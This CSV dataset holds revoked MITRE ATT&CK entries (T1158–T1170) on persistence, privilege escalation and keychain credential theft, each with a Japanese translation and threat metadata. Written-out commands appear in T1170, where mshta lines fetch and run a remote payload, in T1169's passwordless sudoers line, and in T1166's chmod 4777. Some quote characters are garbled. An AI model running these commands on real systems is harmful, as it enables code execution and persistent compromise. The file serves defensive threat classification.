T1158,,Hidden Files and Directories,隠しファイルおよび隠しディレクトリ,"To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden Efile. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS). Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files. ### Windows Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the  Es Emarks a file as a system file and the  Er Eflag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively  ES E ### Linux/Mac Users can mark specific files as hidden simply by putting a  E Eas the first character in the file or folder name (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period,  E E are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls E Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application. ### Mac Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.",通常のユーザーがシステム上の特殊ファイルを誤って変更するのを防ぐため、ほとんどのオペレーティングシステムでは「隠しファイル」という概念を採用しています。これらのファイルは、ユーザーがGUIでファイルシステムを閲覧する際や、コマンドラインで通常のコマンドを使用する際には表示されません。 ユーザーは、一連のグラフィカルユーザーインターフェース（GUI）プロンプトまたはコマンドラインスイッチ（Windowsでは<code>dir /a</code>、LinuxおよびmacOSでは<code>ls –a</code>）を介して、明示的に隠しファイルの表示を要求する必要があります。攻撃者はこの特性を悪用し、システム上の任意の場所にファイルやフォルダを隠蔽することで、持続性を確保し、隠しファイルの調査を含まない一般的なユーザーやシステム分析を回避できます。 ### Windows ユーザーは attrib.exe バイナリを使用して特定のファイルを隠しファイルとしてマークできます。ファイルやフォルダを隠しファイルとしてマークするには、単純に <code>attrib +h ファイル名</code> を実行します。同様に、 E Eフラグはファイルをシステムファイルとしてマークし、 R Eフラグはファイルを読み取り専用としてマークします。 他のWindowsバイナリと同様、attrib.exeは再帰的に変更を適用する機能を提供します。### Linux/Macユーザーは、ファイル名またはフォルダ名の先頭に「.」を付けるだけで特定のファイルを隠しファイルに設定できます（出典: Sofacy Komplex Trojan）（出典: Antiquated Mac Malware）。 ピリオド（.）で始まるファイルやフォルダは、デフォルトでは Finder アプリケーションや「ls」などの標準コマンドラインユーティリティでは表示されません。これらのファイルを表示するには、設定を明示的に変更する必要があります。コマンドラインでは、通常、すべてのファイル（隠しファイルを含む）を表示するフラグがあります。 Finderアプリケーションでこれらのファイルを表示するには、以下のコマンドを実行する必要があります：<code>defaults write com.apple.finder AppleShowAllFiles YES</code>、その後Finderアプリケーションを再起動します。 ### macOS上のMacファイルはUF_HIDDENフラグでマークされ、Finder.appでは表示されませんが、Terminal.appでは表示可能です（引用元：WireLurker）。 多くのアプリケーションは、ユーザーの作業領域を乱雑にしないよう情報を保存するために、こうした隠しファイルや隠しフォルダを作成します。例えば、SSHユーティリティは隠し.sshフォルダを作成し、そこにユーザーの既知のホストや鍵を格納します。,defense-evasion;persistence,Linux;macOS;Windows,remote_service_abuse,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93,2017-12-14T16:46:06.044Z,2025-04-25T15:16:15.339Z,,,,
T1159,,Launch Agent,Launch Agent,"Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware). Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories (Citation: Sofacy Komplex Trojan) (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).",Appleの開発者向けドキュメントによれば、ユーザーがログインすると、ユーザーごとのlaunchdプロセスが起動します。このプロセスは、<code>/System/Library/LaunchAgents</code>、<code>/Library/LaunchAgents</code>、および<code>$HOME/Library/LaunchAgents</code>にあるプロパティリスト（plist）ファイルから、各オンデマンド起動ユーザーエージェントのパラメータを読み込みます。 （引用元: AppleDocs Launch Agent Daemons）（引用元: OSX Keydnap malware）（引用元: Antiquated Mac Malware）。これらの起動エージェントは、起動される実行ファイルを指すプロパティリストファイルを持っています（引用元: OSX.Dok Malware）。 攻撃者は、適切なディレクトリにplistをロードするためにlaunchdまたはlaunchctlを使用し、ログイン時に実行されるように設定可能な新しい起動エージェントをインストールする可能性があります（引用元：Sofacy Komplex Trojan）（引用元：Methods of Mac Malware Persistence）。エージェント名は、関連するオペレーティングシステムや無害なソフトウェアの名前を使用して偽装される場合があります。 起動エージェントはユーザーレベル権限で作成され、ユーザーログイン時にそのユーザーの権限で実行される（出典：OSX Malware Detection）（出典：OceanLotus for OS X）。特定のユーザーがログインした時（そのユーザーのディレクトリ構造内）または任意のユーザーがログインした時（管理者権限が必要）に実行されるよう設定可能である。,persistence,macOS,data_collection,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--dd901512-6e37-4155-943b-453e3777b125,2017-12-14T16:46:06.044Z,2025-04-25T15:16:16.089Z,,,,
T1160,,Launch Daemon,Launch Daemon,"Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.",Appleの開発者向けドキュメントによれば、macOSおよびOS Xの起動時には、システム初期化を完了させるためにlaunchdが実行されます。このプロセスは、<code>/System/Library/LaunchDaemons</code>および<code>/Library/LaunchDaemons</code>にあるプロパティリスト（plist）ファイルから、オンデマンド起動のシステムレベルデーモン各々のパラメータを読み込みます （引用元: AppleDocs Launch Agent Daemons）。これらのLaunchDaemonsは、起動される実行ファイルを指すプロパティリストファイルを持っています（引用元: Methods of Mac Malware Persistence）。攻撃者は、launchdやlaunchctlを使用して適切なディレクトリにplistをロードすることで、起動時に実行されるように設定可能な新しい起動デーモンをインストールする可能性があります（引用元: OSX Malware Detection）。 デーモン名は、関連するオペレーティングシステムや無害なソフトウェアの名前を使用して偽装される可能性があります（引用元：WireLurker）。Launch Daemonは管理者権限で作成される場合がありますが、root権限で実行されるため、攻撃者は管理者権限からroot権限へ昇格させるためにサービスを利用することも可能です。plistファイルの権限はroot:wheelである必要がありますが、それが指すスクリプトやプログラムにはそのような要件はありません。 したがって、設定不備により攻撃者が既存の起動デーモンの実行ファイルを改変し、永続化や権限昇格を実現する可能性が生じる。,persistence;privilege-escalation,macOS,script_command_execution,privilege_gain,privileged_account;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--e99ec083-abdd-48de-ad87-4dbf6f8ba2a4,2017-12-14T16:46:06.044Z,2025-04-25T15:16:19.536Z,,,,
T1161,,LC_LOAD_DYLIB Addition,LC_LOAD_DYLIBの追加,Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time (Citation: Malware Persistence on OS X).,Mach-Oバイナリには、バイナリロード時に特定の操作を実行するための一連のヘッダーが存在します。Mach-Oバイナリ内のLC_LOAD_DYLIBヘッダーは、実行時にロードすべき動的ライブラリ（dylib）をmacOSおよびOS Xに指示します。これらのヘッダーは、他のフィールドや依存関係に適切な調整を加える限り、コンパイル済みバイナリに任意に追加可能です（出典: Writing Bad Malware for OSX）。 これらの変更を実行するツールは存在します。いかなる変更もバイナリが改変されるため、デジタル署名を無効化します。攻撃者は、ロード時に署名がチェックされないよう、単にバイナリからLC_CODE_SIGNATUREコマンドを削除することでこの問題を回避できます（出典: Malware Persistence on OS X）。,persistence,macOS,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--04ef4356-8926-45e2-9441-634b6f3dcecb,2017-12-14T16:46:06.044Z,2025-04-25T15:15:05.774Z,,,,
T1162,,Login Item,ログイン項目,"MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them (Citation: Adding Login Items). Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). These login items are stored in the user's <code>~/Library/Preferences/</code> directory in a plist file called <code>com.apple.loginitems.plist</code> (Citation: Methods of Mac Malware Persistence). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ‘Hide Ethe window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> SMLoginItemSetEnabled </code> can be used to set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1155) can do this as well (Citation: Adding Login Items).",MacOSでは、ユーザーログイン時に実行する特定アプリケーションをリスト化するオプションを提供します。これらのアプリケーションはログインユーザーのコンテキストで実行され、ユーザーがログインするたびに起動されます。サービス管理フレームワークを使用してインストールされたログイン項目は、システム環境設定には表示されず、作成したアプリケーションからのみ削除可能です（引用元：ログイン項目の追加）。 ユーザーは、システム環境設定にも表示される共有ファイルリストを使用してインストールされたログイン項目を直接制御できます（引用元：ログイン項目の追加）。これらのログイン項目は、ユーザーの<code>~/Library/Preferences/</code>ディレクトリ内の<code>com.apple.loginitems.plist</code>というplistファイルに保存されます（引用元：Macマルウェアの永続化手法）。 これらのアプリケーションの一部はユーザーに表示されるダイアログを開くことができますが、すべてがそうする必要はありません。なぜなら「ウィンドウを非表示にする」オプションがあるからです。攻撃者が独自のログイン項目を登録したり、既存のものを改変したりできれば、ユーザーがログインするたびに永続化メカニズムとして自身のコードを実行するためにそれを利用できます（引用元：OS Xにおけるマルウェアの永続化）（引用元：OSX.Dokマルウェア）。 ログイン項目を設定するにはAPIメソッド<code> SMLoginItemSetEnabled </code>が使用可能ですが、[AppleScript](https://attack.mitre.org/techniques/T1155)などのスクリプト言語でも同様の操作が可能です（引用元：ログイン項目の追加）。,persistence,macOS,script_command_execution,foothold,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--36675cd3-fe00-454c-8516-aebecacbe9d9,2017-12-14T16:46:06.044Z,2025-04-18T17:59:20.596Z,,,,
T1163,,Rc.common,Rc.common,"During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used. Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).",macOS は起動プロセス中に <code>source /etc/rc.common</code> を実行します。これは様々なユーティリティ関数を含むシェルスクリプトです。このファイルはコマンドライン引数の処理やシステム設定の収集ルーチンも定義しているため、スタートアップ項目スクリプトの開始部に含めることが推奨されます（引用元: Startup Items）。 macOS および OS X では、これは現在、起動エージェントや起動デーモンに取って代わられ非推奨の手法となっていますが、現在もなお使用されています。攻撃者は、rc.common ファイルを利用して、再起動のたびに root ユーザーとして実行される永続化のためのコードを隠蔽することができます（引用元：Mac マルウェアの永続化手法）。,persistence,macOS,script_command_execution,foothold,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--18d4ab39-12ed-4a16-9fdb-ae311bba4a0f,2017-12-14T16:46:06.044Z,2025-04-25T15:15:12.163Z,,,,
T1164,,Re-opened Applications,再起動時に開くアプリケーション,"Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~/Library/Preferences/com.apple.loginwindow.plist</code> and <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).",Mac OS X 10.7 (Lion) 以降、ユーザーはマシンを再起動した際に特定のアプリケーションを再起動するよう指定できます。 通常はアプリケーションごとにグラフィカルユーザーインターフェース（GUI）経由で設定されますが、この情報はプロパティリストファイル（plist）にも格納されており、<code>~/Library/Preferences/com.apple.loginwindow.plist</code> および <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code> に存在します。 攻撃者は、これらのファイルのいずれかを直接変更して、悪意のある実行ファイルへのリンクを含めることで、ユーザーがマシンを再起動するたびに永続化メカニズムを提供することができます（引用元：Mac マルウェアの永続化手法）。,persistence,macOS,discovery_enumeration,foothold,authentication_system;user_interaction;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--6a3be63a-64c5-4678-a036-03ff8fc35300,2017-12-14T16:46:06.044Z,2025-04-25T15:15:40.360Z,,,,
T1165,,Startup Items,スタートアップ項目,"Per Apple’s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.",Apple のドキュメントによると、スタートアップ項目は起動プロセスの最終段階で実行され、シェルスクリプトやその他の実行可能ファイル、およびシステムがすべてのスタートアップ項目の実行順序を決定するために使用する構成情報を含みます（引用元：スタートアップ項目）。 技術的には非推奨のバージョン（Launch Daemonsに取って代わられた）であるため、適切なフォルダ<code>/Library/StartupItems</code>がデフォルトでシステムに存在することは保証されていませんが、macOS Sierraではデフォルトで存在しているようです。 スタートアップ項目とは、実行ファイルと設定プロパティリスト（plist）である<code>StartupParameters.plist</code>が最上位ディレクトリに配置されるディレクトリを指します。攻撃者はStartupItemsディレクトリ内に適切なフォルダ/ファイルを作成することで、独自の永続化メカニズムを登録できます（引用元：Macマルウェアの永続化手法）。 さらに、StartupItems は macOS の起動フェーズ中に実行されるため、root 権限で実行されます。攻撃者が既存のスタートアップ項目を変更できれば、権限昇格も可能になります。,persistence;privilege-escalation,macOS,script_command_execution,privilege_gain,privileged_account;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f,2017-12-14T16:46:06.044Z,2025-04-25T15:15:18.749Z,,,,
T1166,,Setuid and Setgid,Setuid と Setgid,"When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future (Citation: OSX Keydnap malware).",LinuxやmacOSでアプリケーションにsetuidまたはsetgidビットが設定されている場合、そのアプリケーションは所有ユーザーまたはグループの権限で実行されることを意味します（出典: setuid manページ）。通常、アプリケーションは所有ユーザーやグループに関係なく、現在のユーザーのコンテキストで実行されます。 プログラムが正常に機能するために昇格されたコンテキストで実行される必要がある場合でも、それを実行するユーザー自身に昇格された特権は必要ない場合があります。root 権限で実行する必要がある sudoers ファイルへのエントリ作成に代わって、任意のユーザーが自身のアプリケーションに対して setuid または setgid フラグを設定できます。 これらのビットは、<code>ls -l</code>でファイル属性を表示する際、「x」ではなく「s」で示されます。<code>chmod</code>プログラムでは、ビットマスク指定（<code>chmod 4777 [ファイル]</code>）または省略形命名（<code>chmod u+s [ファイル]</code>）でこれらのビットを設定できます。 攻撃者はこれを悪用し、シェルエスケープを実行したり、setsuid または setgid ビットを持つアプリケーションの脆弱性を突いて、異なるユーザーのコンテキストでコードを実行させることが可能です。さらに、攻撃者は自身のマルウェアにこのメカニズムを組み込み、将来的に特権コンテキストで確実に実行できるようにすることもできます（引用元: OSX Keydnap マルウェア）。,privilege-escalation;persistence,Linux;macOS,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0003,attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2,2017-12-14T16:46:06.044Z,2025-04-25T15:16:05.881Z,,,,
T1167,,Securityd Memory,Securitydメモリ,"In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain) If an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)","El Capitan以前のOS Xでは、root権限を持つユーザーはログイン中のユーザーの平文キーチェーンパスワードを読み取ることが可能です。これはAppleのキーチェーン実装が、パスワードの繰り返し入力を回避するためこれらの認証情報をキャッシュすることを許可しているためです。 (引用: OS X Keychain) (引用: External to DA, the OS X Way) Appleのsecuritydユーティリティはユーザーのログオンパスワードを受け取り、PBKDF2で暗号化してこのマスターキーをメモリに保存します。Appleはユーザーのパスワードを暗号化するためにも一連の鍵とアルゴリズムを使用しますが、一度マスターキーが判明すれば、攻撃者は他の値を順に試すだけで最終的なパスワードを解読できます。 (引用元: OS X Keychain) 攻撃者がrootアクセス権を取得した場合（securitydのメモリを読み取れる状態）、メモリをスキャンして比較的少ない試行回数で正しいキーのシーケンスを見つけ出し、ユーザーのログインキーチェーンを復号できます。 これにより、攻撃者はユーザー、WiFi、メール、ブラウザ、証明書、セキュアノートなどのすべての平文パスワードを入手できます。(引用: OS X Keychain) (引用: OSX Keydnap マルウェア)",credential-access,macOS,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM);Wireless Access Point,revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--2715c335-1bf2-4efe-9f18-0691317ff83b,2017-12-14T16:46:06.044Z,2025-04-25T15:15:17.371Z,,,,
T1168,,Local Job Scheduling,ローカルジョブスケジューリング,"On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH). ### cron System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems. Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account. ### at The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes. ### launchd Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.",Linux および macOS システムでは、事前にスケジュールされた定期的なバックグラウンドジョブを作成するために、cron、at、launchd など、複数の方法がサポートされています。 (引用元: AppleDocs Scheduling Timed Jobs) Windowsシステムの[Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)とは異なり、Linuxベースのシステムでは、セキュアシェル(SSH)のような確立されたリモートセッション内で使用する場合を除き、リモートでのジョブスケジューリングはできません。 ### cron システム全体のcronジョブは、<code>/etc/crontab</code>ファイル、<code>/etc/cron.d/</code>ディレクトリ、またはcronデーモンがサポートするその他の場所を変更することで設定されます。一方、ユーザーごとのcronジョブは、特定の形式で作成されたcrontabファイルを使用してcrontabで設定されます。(引用元: AppleDocs Scheduling Timed Jobs) これはmacOSおよびLinuxシステムで機能します。 これらの方法により、コマンドやスクリプトを特定の周期でバックグラウンド実行でき、ユーザー操作を必要としません。攻撃者はジョブスケジューリングを悪用し、システム起動時や定期的なタイミングでプログラムを実行して持続性を確保する可能性があります（引用元: Janicab）（引用元: Methods of Mac Malware Persistence）（引用元: Malware Persistence on OS X）。 （引用元：Avast Linux Trojan Cron Persistence）横方向移動の一環として実行を継続したり、root権限を取得したり、特定アカウントのコンテキストでプロセスを実行したりするためです。 ### at macOSやLinuxを含むPOSIXベースシステムでは、atプログラムもプログラムやスクリプトジョブを後日・特定時刻に実行するようスケジュールする手段であり、同様の目的で使用可能です。 ### launchd 各launchdジョブは、[Launch Daemon](https://attack.mitre.org/techniques/T1160)や [Launch Agent](https://attack.mitre.org/techniques/T1159)に類似した構成プロパティリスト（plist）ファイルで記述されます。ただし、時間値の辞書を含む<code>StartCalendarInterval</code>という追加キーが存在します（引用元: AppleDocs Scheduling Timed Jobs）。これはmacOSおよびOS Xでのみ動作します。,persistence;execution,Linux;macOS,credential_abuse,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0002,attack-pattern--c0a384a4-9a25-40e1-97b6-458388474bc8,2017-12-14T16:46:06.044Z,2025-04-25T15:16:05.693Z,,,,
T1169,,Sudo,Sudo,"The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code> (Citation: OSX.Dok Malware). Adversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.",sudoersファイル（`/etc/sudoers`）は、どのユーザーがどのコマンドを、どの端末から実行できるかを記述します。また、ユーザーが他のユーザーやグループとして実行できるコマンドも定義します。これにより最小権限の概念が実現され、ユーザーはほとんどの時間、可能な限り低い権限で動作し、必要に応じて（通常はパスワード入力を促すことで）他のユーザーや権限に昇格します。 ただし、sudoersファイルでは<code>user1 ALL=(ALL) NOPASSWD: ALL</code>のような行でパスワード入力を省略する設定も可能です（出典: OSX.Dok Malware）。攻撃者はこの設定を悪用し、他のユーザーとしてコマンドを実行したり、より高い権限でプロセスを生成したりできます。ただし、このファイルを編集するには昇格された権限が必要です。,privilege-escalation,Linux;macOS,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0004,attack-pattern--9e80ddfb-ce32-4961-a778-ca6a10cfae72,2017-12-14T16:46:06.044Z,2025-04-25T15:15:55.648Z,,,,
T1170,,Mshta,Mshta,"Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications) Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code> They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code> Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)","Mshta.exe は Microsoft HTML アプリケーション (HTA) を実行するユーティリティです。HTA ファイルの拡張子は <code>.hta</code> です（出典: Wikipedia HTML Application）。HTA はスタンドアロンアプリケーションであり、Internet Explorer と同じモデルと技術を使用して実行されますが、ブラウザ外で動作します。 （出典: MSDN HTML Applications）攻撃者は、信頼されたWindowsユーティリティを介して悪意のある.htaファイルやJavaScript/VBScriptの実行をプロキシするためにmshta.exeを利用できます。 初期侵害時やコード実行においてmshta.exeを悪用する様々な脅威の事例が複数存在する（引用元：Cylance Dust Storm）（引用元：Red Canary HTA Abuse Part Deux）（引用元：FireEye Attacks Leveraging HTA） (引用元: Airbus Security Kovter Analysis) (引用元: FireEye FIN7 April 2017) ファイルはインラインスクリプト経由でmshta.exeによって実行される可能性があります: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code> またURLから直接実行される場合もあります: <code>mshta http[:]//webserver/payload[.]hta</code> mshta.exeは、その潜在的な使用を考慮していないアプリケーションホワイトリストソリューションをバイパスするために使用できます。mshta.exeはInternet Explorerのセキュリティコンテキスト外で実行されるため、ブラウザのセキュリティ設定もバイパスします。(引用元: LOLBAS 